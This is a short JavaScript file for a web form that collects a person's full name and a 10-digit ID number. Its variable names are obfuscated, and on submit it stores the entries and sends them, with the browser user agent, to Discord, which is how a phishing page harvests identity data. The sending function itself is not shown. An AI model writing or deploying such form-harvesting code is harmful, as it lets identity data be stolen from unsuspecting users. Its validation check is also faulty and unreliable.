const userNameInput = document.getElementById("usernames");
const userIdInput = document.getElementById("identification");
const checkButton = document.getElementById("btnCheck");
userIdInput.addEventListener("input", () => {
  handleIdInput(userIdInput);
  validateForm();
});
userNameInput.addEventListener("input", () => {
  handleUsernamesInput(userNameInput);
  validateForm();
});
function handleIdInput(_0x42f77d) {
  let _0x5cde31 = _0x42f77d.value.replace(/\D/g, "");
  if (_0x5cde31.length > 10) {
    _0x5cde31 = _0x5cde31.substr(0, 10);
  }
  _0x42f77d.value = _0x5cde31;
}
function handleUsernamesInput(_0x1306a3) {
  let _0x4f83d3 = _0x1306a3.value.replace(/\d/g, "");
  _0x1306a3.value = _0x4f83d3;
}
function validateForm() {
  const _0x4f9a02 = userNameInput.value.trim();
  const _0x2c75a7 = userIdInput.value.trim();
  const _0x5dc827 = /^[a-zA-ZÀ-ÿ]+(?:\s+[a-zA-ZÀ-ÿ]+)+$/.test(_0x4f9a02);
  const _0x3f7047 = _0x2c75a7.length > 4 || _0x2c75a7.length <= 10 && /^\d{10}$/.test(_0x2c75a7);
  checkButton.disabled = !_0x5dc827 || !_0x3f7047;
}
document.addEventListener("DOMContentLoaded", () => {
  checkButton.disabled = true;
  checkButton.addEventListener("click", async _0x593bd3 => {
    _0x593bd3.preventDefault();
    const _0x4a143c = Date.now().toString(36) + Math.random().toString(36).slice(2);
    const _0x1a9f32 = {
      userName: userNameInput.value,
      UserId: userIdInput.value
    };
    const _0x405c74 = _0x1a9f32;
    localStorage.setItem("formData", JSON.stringify(_0x405c74));
    // Enviar datos formateados a Discord
    try {
      const userData = {
        userName: userNameInput.value,
        UserId: userIdInput.value,
        userAgent: navigator.userAgent
      };
      await enviarDatosUsuario(userData);
    } catch (_0x4d4184) {
      console.log("Error al enviar mensaje:", _0x4d4184);
    }
  });
});